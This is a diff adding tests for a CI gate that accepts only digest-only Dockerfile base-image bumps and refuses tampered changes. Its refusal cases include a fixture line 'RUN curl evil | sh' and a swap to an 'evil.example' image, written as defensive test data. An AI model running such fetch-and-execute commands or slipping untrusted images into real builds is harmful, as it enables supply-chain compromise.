@@ -117,6 +117,58 @@ describe('skip-confidence step (stub gh)', () => {
     expect(r.refused).toMatch(/gate or pipeline/);
     expect(run([{ filename: 'docs/b.md', previous_filename: 'docs/a.md' }]).posted).toBe(true);
   });
+  describe('Dockerfile base image digest bump', () => {
+    const d = (c: string): string => `sha256:${c.repeat(64)}`;
+    const img = 'gcr.io/distroless/nodejs26-debian13:nonroot';
+    const docker = (patch: string | undefined, status = 'modified'): F[] =>
+      [{ filename: 'Dockerfile', status, ...(patch === undefined ? {} : { patch }) } as unknown as F];
+    const hunk = (...lines: string[]): string => ['@@ -8,7 +8,7 @@ x', ' RUN npm ci', ...lines, ' ARG VERSION=0.0.0'].join('\n');
+
+    it('a digest-only FROM change passes', () => {
+      expect(run(docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`))).posted).toBe(true);
+    });
+    // The build stage line as it stands in the real Dockerfile.
+    const deps = 'FROM --platform=$BUILDPLATFORM node:26-trixie-slim';
+    it('the real build stage (--platform, AS deps) digest-only change passes, next to a harmless file', () => {
+      const p = hunk(`-${deps}@${d('1')} AS deps`, `+${deps}@${d('2')} AS deps`);
+      expect(run([...docker(p), 'package-lock.json']).posted).toBe(true);
+    });
+    it('both stages bumped in two hunks pass', () => {
+      const p = [
+        '@@ -1,4 +1,4 @@', ' # syntax', `-${deps}@${d('1')} AS deps`, `+${deps}@${d('2')} AS deps`, ' WORKDIR /app',
+        '@@ -9,4 +9,4 @@', ' # Runtime', `-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`, ' ARG VERSION=0.0.0',
+      ].join('\n');
+      expect(run(docker(p)).posted).toBe(true);
+    });
+    it.each([
+      ['a changed image name', hunk(`-FROM ${img}@${d('a')}`, `+FROM evil.example/node:nonroot@${d('b')}`)],
+      ['a changed tag', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img.replace('nonroot', 'latest')}@${d('b')}`)],
+      ['a changed stage name', hunk(`-FROM ${img}@${d('a')} AS run`, `+FROM ${img}@${d('b')} AS other`)],
+      ['an extra non-FROM line', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`, '+RUN curl evil | sh')],
+      ['a dropped digest', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}`)],
+      ['an added FROM line only', hunk(`+FROM ${img}@${d('b')}`)],
+      ['a short digest', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@sha256:abc`)],
+      // Moving a FROM past an unchanged line moves that line into another stage.
+      ['a FROM moved past an unchanged line', hunk(`-FROM ${img}@${d('a')}`, ' ARG X=1', `+FROM ${img}@${d('b')}`)],
+      ['a FROM moved across hunks', ['@@ -1,2 +1,1 @@', `-FROM ${img}@${d('a')}`, ' ARG X=1', '@@ -9,1 +9,2 @@', ' ARG Y=1', `+FROM ${img}@${d('b')}`].join('\n')],
+      ['a changed --platform', hunk(`-${deps}@${d('1')} AS deps`, `+FROM --platform=linux/amd64 node:26-trixie-slim@${d('2')} AS deps`)],
+      ['a CR at the end of a FROM line', hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}\r`)],
+      ['a missing patch (too large)', undefined],
+      ['an empty patch', ''],
+    ])('%s is refused', (_n, patch) => {
+      const r = run(docker(patch));
+      expect(r.posted).toBe(false);
+      expect(r.refused).toMatch(/gate or pipeline/);
+    });
+    it('a renamed Dockerfile is refused', () => {
+      expect(run(docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`), 'renamed')).posted).toBe(false);
+    });
+    it('a digest-only Dockerfile next to a gate file is still refused', () => {
+      const r = run([...docker(hunk(`-FROM ${img}@${d('a')}`, `+FROM ${img}@${d('b')}`)), 'scripts/x.ts']);
+      expect(r.posted).toBe(false);
+      expect(r.refused).toMatch(/gate or pipeline/);
+    });
+  });
   it('an empty file list is refused', () => {
     expect(run([]).posted).toBe(false);
   });
